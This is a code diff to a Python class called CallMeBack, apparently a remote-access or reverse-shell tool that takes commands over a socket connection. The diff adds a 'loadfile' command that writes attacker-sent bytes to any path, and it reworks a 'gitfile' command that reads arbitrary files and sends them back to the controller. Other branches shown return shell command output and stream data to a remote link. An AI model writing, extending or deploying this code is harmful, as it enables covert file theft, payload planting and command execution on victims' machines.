@@ -89,7 +89,7 @@ class CallMeBack:
                     Link = 'http://'+f'{IPaddress}'+':'+str(Port)
                     SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(Link.encode()+'\n'.encode('latin-1')))
                     SendBack.sendall(bytes(path.encode()))
-                    thread = threading.Thread(target=self.StreamChannel)  
+                    thread = threading.Thread(target=self.StreamChannel)
                     thread.start()
                     continue
                 elif 'kill' in data:
@@ -97,17 +97,32 @@ class CallMeBack:
                     StreamStop = 'Stream is End\n'.encode('latin-1')  
                     SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(StreamStop))
                     SendBack.sendall(bytes(path.encode()))
-                elif 'getfile' in data :
+                elif 'gitfile' in data :
                     data = data.split()
-                    with open(str("".join(data[-1])),'rb') as FileData:
-                        FileData = FileData.read()     
-                        SendBack.send(len(FileData).to_bytes(4, byteorder='big'))
-                        SendBack.sendall(FileData)
+                    try:
+                        with open(str("".join(data[-1])),'rb') as FileData:
+                            FileData = FileData.read()     
+                            SendBack.send(len(FileData).to_bytes(4, byteorder='big'))
+                            SendBack.sendall(FileData)
+                    except FileNotFoundError:
+                           pass
+                elif 'loadfile' in data.split()[0] :
+                    LenDataFile = SendBack .recv(4)
+                    LenDataFile = int.from_bytes(LenDataFile, byteorder='big')
+                    FileDataGet = b''
+                    while len(FileDataGet) < LenDataFile:
+                        BytesBlock = SendBack.recv(LenDataFile - len(FileDataGet))
+                        if not BytesBlock:
+                            break
+                        FileDataGet += BytesBlock
+                    with open(data.split()[-1], 'wb') as file:
+                        file.write(FileDataGet)
+                    SendBack.sendall(bytes(path.encode()))
                 elif 'returncode=1' in str(Data) :
                        Except = str(data) +' not recognized as an internal or external command'.replace('\n','')
                        SendBack.sendall(bytes(path.encode())), SendBack.sendall(Except.encode()+'\n'.encode('latin-1'))
                        SendBack.sendall(bytes(path.encode())) 
-  
+              
                 else:
                      Data =bytes(Data.stdout.decode('latin-1').encode())
                      SendBack.sendall(Data)
